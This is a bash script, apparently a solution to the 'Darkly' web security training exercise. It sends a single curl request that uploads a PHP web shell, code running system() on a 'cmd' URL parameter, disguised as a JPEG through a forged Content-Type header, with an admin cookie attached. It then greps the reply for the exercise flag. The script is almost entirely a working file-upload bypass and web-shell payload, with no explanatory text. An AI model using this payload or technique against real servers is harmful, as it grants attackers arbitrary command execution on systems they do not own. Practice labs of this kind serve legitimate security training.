#!/bin/bash

curl -s 'http://darkly/?page=upload#' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: multipart/form-data; boundary=---------------------------4293360664942376156102299' -H 'Origin: http://darkly' -H 'Connection: keep-alive' -H 'Referer: http://darkly/?page=upload' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-binary $'-----------------------------4293360664942376156102299\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\n\n100000\n-----------------------------4293360664942376156102299\nContent-Disposition: form-data; name="uploaded"; filename="test.php"\nContent-Type: image/jpg\n\n<?php\nif(isset($_GET[\'cmd\']))\n{\n\x09system($_GET[\'cmd\']);\n}\n?>\n\n\r\n\r\n-----------------------------4293360664942376156102299\nContent-Disposition: form-data; name="Upload"\n\nUpload\n-----------------------------4293360664942376156102299--\r\n' | grep --color -ioE "The flag is : .{64}"
